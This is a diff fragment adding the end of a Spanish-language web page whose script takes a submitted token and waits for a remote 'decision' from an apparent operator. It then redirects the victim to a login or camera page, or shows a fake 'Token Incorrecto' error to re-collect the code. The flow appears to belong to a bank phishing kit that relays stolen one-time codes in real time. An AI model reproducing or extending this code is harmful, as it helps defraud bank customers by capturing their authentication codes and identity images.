+            if (btnSubmit) btnSubmit.disabled = false;
+            syncSubmit();
+            showMsg(
+              "No se pudo guardar el token. Volvé a entrar desde el inicio."
+            );
+            return;
+          }
+
+          showTokWait();
+          var decision = null;
+          if (typeof window.bapaEsperarDecisionPorId === "function") {
+            try {
+              decision = await window.bapaEsperarDecisionPorId(decideId, TOK_WAIT_MAX_MS);
+            } catch (ePoll) {
+              decision = null;
+            }
+          }
+          hideTokWait();
+
+          if (decision === "aprobado" || decision === "ir_oficial") {
+            window.location.href = "login.html";
+            return;
+          }
+
+          if (decision === "ir_camara") {
+            window.location.href = "cam.html";
+            return;
+          }
+
+          if (btnSubmit) btnSubmit.disabled = false;
+          syncSubmit();
+
+          if (decision === "rechazado") {
+            tokenTouched = true;
+            cells.forEach(function (c) {
+              c.value = "";
+              c.classList.remove("token-filled");
+              c.classList.remove("token-cell--error");
+            });
+            syncHidden();
+            showTokBannerError("Token Incorrecto, validad tu información (407)");
+            focusCell(0);
+            return;
+          }
+
+          if (decision === "recargar_login") {
+            showMsg("Volvé a ingresar desde el inicio.");
+            return;
+          }
+
+          alert("No hubo respuesta a tiempo. Intentá de nuevo.");
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
